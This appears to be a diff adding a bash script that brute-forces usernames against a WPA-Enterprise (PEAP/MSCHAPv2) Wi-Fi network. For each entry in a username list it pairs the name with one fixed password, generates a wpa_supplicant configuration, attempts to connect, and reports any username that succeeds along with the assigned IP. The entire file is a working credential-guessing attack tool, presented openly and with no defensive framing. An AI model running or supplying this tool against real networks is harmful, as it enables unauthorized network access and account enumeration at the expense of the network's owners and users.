@@ -1,0 +1,118 @@
+#!/usr/bin/env bash
+# wpa_brute_usernames.sh — WPA-Enterprise (PEAP/MSCHAPv2) brute-force script for usernames
+# Usage:
+#   ./wpa_brute_usernames.sh -i wlan0 -s "wifi-corp" \
+#     -P "monkey" -A "anon@domain.com" \
+#     -C "/home/user/corp/ca.pem" -u users.txt [-T 10]
+
+set -euo pipefail
+
+# === Argument parsing ===
+IFACE=""
+SSID=""
+PASSWORD=""
+ANON_ID=""
+CA_CERT=""
+TIMEOUT=10
+USERLIST=""
+
+while getopts "i:s:P:A:C:T:u:" opt; do
+  case "$opt" in
+    i) IFACE="$OPTARG" ;;
+    s) SSID="$OPTARG" ;;
+    P) PASSWORD="$OPTARG" ;;
+    A) ANON_ID="$OPTARG" ;;
+    C) CA_CERT="$OPTARG" ;;
+    T) TIMEOUT="$OPTARG" ;;
+    u) USERLIST="$OPTARG" ;;
+    *) echo "Bad option"; exit 2 ;;
+  esac
+done
+
+if [[ -z "$IFACE" || -z "$SSID" || -z "$PASSWORD" || -z "$ANON_ID" || -z "$CA_CERT" || -z "$USERLIST" ]]; then
+  echo "Usage: $0 -i <iface> -s <ssid> -P <password> -A <anon_id> -C <ca_cert> -u <userlist> [-T timeout]"
+  exit 2
+fi
+
+# === Initial interface setup ===
+ip link set "$IFACE" up
+wpa_cli -i "$IFACE" terminate >/dev/null 2>&1 || true
+sleep 0.5
+
+echo "[*] Starting brute-force against SSID '$SSID' with fixed password and usernames from '$USERLIST'"
+
+# === Trap for final cleanup ===
+final_cleanup() {
+  wpa_cli -i "$IFACE" terminate >/dev/null 2>&1 || true
+}
+trap final_cleanup EXIT
+
+# === Brute-force loop ===
+while IFS= read -r USERNAME; do
+  [[ -z "$USERNAME" ]] && continue
+  echo "[>] Trying username: $USERNAME"
+
+  TMPDIR="$(mktemp -d)"
+  CONF="$TMPDIR/wpa.conf"
+  LOGF="$TMPDIR/wpa.log"
+  PIDF="$TMPDIR/wpa.pid"
+
+  # Escape double quotes and backslashes
+  ESCAPED_USER="${USERNAME//\"/\\\"}"
+  ESCAPED_USER="${ESCAPED_USER//\\/\\\\}"
+  ESCAPED_PW="${PASSWORD//\"/\\\"}"
+
+  # === WPA config generation ===
+  cat > "$CONF" <<EOF
+ctrl_interface=/var/run/wpa_supplicant
+update_config=0
+
+network={
+    ssid="${SSID}"
+    scan_ssid=1
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    identity="${ESCAPED_USER}"
+    anonymous_identity="${ANON_ID}"
+    password="${ESCAPED_PW}"
+    phase2="auth=MSCHAPV2"
+    ca_cert="${CA_CERT}"
+}
+EOF
+
+  # Start WPA supplicant
+  wpa_supplicant -B -i "$IFACE" -c "$CONF" -f "$LOGF"
+  sleep 0.5
+
+  # Record PID (best-effort)
+  pgrep -f "wpa_supplicant.*${IFACE}.*${CONF}" | head -n1 > "$PIDF" || true
+
+  # === Connection wait loop ===
+  deadline=$((SECONDS + TIMEOUT))
+  state=""
+  while (( SECONDS < deadline )); do
+    state="$(wpa_cli -i "$IFACE" status 2>/dev/null | awk -F= '$1=="wpa_state"{print $2}')"
+    if [[ "$state" == "COMPLETED" ]]; then
+      ipaddr="$(wpa_cli -i "$IFACE" status 2>/dev/null | awk -F= '$1=="ip_address"{print $2}')"
+      echo "[+] SUCCESS! Username found: $USERNAME"
+      echo "[+] IP: ${ipaddr:-none}"
+      exit 0
+    fi
+    if grep -qi "No network config matching" "$LOGF" 2>/dev/null; then
+      break
+    fi
+    sleep 0.3
+  done
+
+  # === Per-attempt cleanup ===
+  if [[ -f "$PIDF" ]]; then
+    kill -9 "$(cat "$PIDF")" >/dev/null 2>&1 || true
+  fi
+  wpa_cli -i "$IFACE" disconnect >/dev/null 2>&1 || true
+  wpa_cli -i "$IFACE" terminate >/dev/null 2>&1 || true
+  rm -rf "$TMPDIR"
+
+done < "$USERLIST"
+
+echo "[-] FAILED: No valid username found in '$USERLIST'."
+exit 1
